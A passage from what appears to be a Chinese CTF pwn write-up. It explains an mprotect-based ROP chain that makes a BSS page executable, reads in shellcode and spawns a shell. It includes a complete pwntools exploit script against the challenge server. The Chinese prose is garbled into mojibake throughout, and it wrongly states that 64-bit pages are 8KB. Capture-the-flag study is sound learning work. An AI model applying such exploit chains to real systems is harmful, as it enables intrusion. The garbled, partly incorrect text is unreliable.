&lt;li&gt;&lt;strong&gt;é€‰æ‹©åŸå› &lt;/strong&gt;ï¼š&lt;code&gt;mprotect&lt;/code&gt; è¦æ±‚æ“ä½œçš„å†…å­˜åœ°å€å¿…é¡» &lt;strong&gt;é¡µå¯¹é½&lt;/strong&gt;ï¼ˆå³åœ°å€æ˜¯ 4KB/0x1000 çš„æ•´æ•°å€ï¼Œ32 ä½ç³»ç»Ÿé»˜è®¤é¡µå¤§å°ä¸º 4KBï¼‰ï¼ˆ64ä½å°±æ˜¯8kbå’¯ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;ç¨‹åº BSS æ®µèµ·å§‹åœ°å€ï¼ˆå¦‚ &lt;code&gt;0x80DB320&lt;/code&gt;ï¼‰ä¸æ»¡è¶³é¡µå¯¹é½ï¼Œè€Œ &lt;code&gt;0x80DA000&lt;/code&gt; æ˜¯å†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼ˆæœ«å°¾ä¸‰ä½ä¸º 000ï¼Œç¬¦åˆ 4KB å¯¹é½ï¼‰ï¼Œä¸”å±äºç¨‹åºå¯è®¿é—®çš„å†…å­˜åŒºåŸŸã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç„¶åå°±æ˜¯mprotectå‡½æ•°å‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;a1æ˜¯startèµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯0x80DA000ï¼›a2æ˜¯é•¿åº¦èŒƒå›´ï¼Œè¿™é‡Œé€‰æ‹©0x1000ï¼Œè¶³å¤Ÿæˆ‘ä»¬å®¹çº³shellcodeå¤§å°äº†ï¼›a3æ˜¯protï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹æˆçš„æƒé™èŒƒå›´ï¼Œè¿™é‡Œç›´æ¥æ”¹ä¸ºRWXï¼Œä¹Ÿå°±æ˜¯ç®€å†™&lt;code&gt;0x7&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åæ˜¯æ§åˆ¶å‡½æ•°å‚æ•°çš„å·¥å…·â€”â€”å…³é”®&lt;code&gt;gadgets&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;32ä½ç¨‹åºç”¨æ ˆä¼ å‚çš„ï¼Œè¿™é‡Œçš„mprotectå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä¸”è°ƒç”¨åéœ€ç»§ç»­æ§åˆ¶æµç¨‹ï¼Œå› æ­¤éœ€è¦ &lt;code&gt;pop ebx ; pop esi ; pop ebp ; ret&lt;/code&gt; è¿™æ ·çš„ Gadgetï¼Œç”¨ROPgadgetæŒ‡ä»¤æŸ¥è¯¢åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/158.png&#34;
	width=&#34;1116&#34;
	height=&#34;505&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/158_hu_4a650557b39f9dbd.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/158_hu_f4b49bbc5059aa15.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;530px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;pop ebx ; pop esi ; pop ebp ; retçš„åœ°å€æ˜¯0x080a019b&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28132&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mprotect&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;read_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;read&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx_esi_ebp_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80a019b&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80DA000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;proc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx_esi_ebp_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx_esi_ebp_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¯¹äºpayloadï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx_esi_ebp_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx_esi_ebp_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å…ˆå¡«å……ç¼“å†²åŒºï¼Œè°ƒç”¨mprotectå‡½æ•°ï¼Œæ¥ç€è¾“å…¥mprotectå‡½æ•°çš„3ä¸ªå‚æ•°ï¼Œåœ¨æ­¤ä¹‹å‰å°±è¦ç”¨åˆ°gadgetï¼špop_ebx_esi_ebp_retè¿›è¡Œä¼ å‚ï¼ŒæŒ‰ç…§mprotectå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°å¯¹åº”æ„ä¹‰è¿›è¡Œæ³¨å…¥startã€sizeã€procï¼Œè¿™æ—¶å·²ç»ç»™bsså†…å­˜ç‰‡æ®µå¼€æ”¾äº†å¯æ‰§è¡Œæƒé™ï¼Œç„¶åè¯»å–readå‡½æ•°åœ°å€è¿›è€Œè°ƒç”¨readå‡½æ•°ï¼Œå†ç”¨gadgetï¼špop_ebx_esi_ebp_retè¿›è¡Œä¼ readçš„3ä¸ªå‚æ•°ï¼Œ&lt;strong&gt;è¯»å– åé¢æˆ‘ä»¬æ‰€ä¸Šä¼ çš„shellcode åˆ°ç›®æ ‡å†…å­˜&lt;/strong&gt;æ¥æ‰§è¡Œã€‚æœ€åä¸Šä¼ shellcodeã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®ä½ å¯ä»¥å‘ç°è¿™ä¹Ÿæ˜¯ret2shellcodeçš„å…¶ä¸­ä¸€ç§ï¼Œåªä¸è¿‡å¤šåŠ äº†mprotectå‡½æ•°æ§åˆ¶æµç¨‹ç½¢äº†ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ•´ä¸ªæµç¨‹çš„æ ¸å¿ƒé€»è¾‘å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºæ„å»º â€œå‡½æ•°è°ƒç”¨é“¾â€ï¼Œé€æ­¥å®Œæˆ â€œå¼€æƒé™â†’å†™ä»£ç â†’æ‰§è¡Œä»£ç â€ çš„æ”»å‡»æµç¨‹ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;å¯¹äºè¿™é“é¢˜è€Œè¨€å¯¹æˆ‘æ„Ÿè§¦æ¯”è¾ƒæ·±ï¼ŒåŠ æ·±æˆ‘å¯¹å¯„å­˜å™¨ã€gadgetã€æ•´ä¸ªå‡½æ•°è°ƒç”¨æµç¨‹ã€å‚æ•°ä¼ é€’è¿‡ç¨‹çš„ç†è§£ï¼å¦‚æœä½ è§‰å¾—å¾ˆéš¾è€Œè·³è¿‡ï¼Œé‚£ä½ å°±é”™è¿‡äº†ä¸€æ¬¡PWNå…¥é—¨è€…çš„æå‡æœºä¼šï¼Œåšä¸»å½“æ—¶å•ƒè¿™é¢˜èŠ±äº†å¿«ä¸¤å¤©æ—¶é—´ï¼Œå‡Œæ™¨æ‰å†™å®Œè¿™é¢˜çš„writeupå‘¢ï¼ŒèŠ±ç‚¹è€å¿ƒå»å­¦ï¼ŒPWNerï¼&lt;/p&gt;
&lt;h3 id=&#34;pwn_050&#34;&gt;PWN_050
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå¥½åƒå“ªé‡Œä¸ä¸€æ ·äº†ï¼›è¿œç¨‹libcç¯å¢ƒ Ubuntu 18ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_050&#34; &gt;PWN_050&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œä½ å¯ä»¥ç»§ç»­ä½¿ç”¨ret2libcæ¥å®Œæˆè¿™é¢˜ï¼Œç”šè‡³ä¼šæ›´ç®€å•ï¼Œè€Œæˆ‘çš„ç›®çš„æ˜¯ä¸ºäº†è®©å¤§å®¶è¿›ä¸€æ­¥å­¦mprotectå‡½æ•°ã€‚&lt;/p&gt;
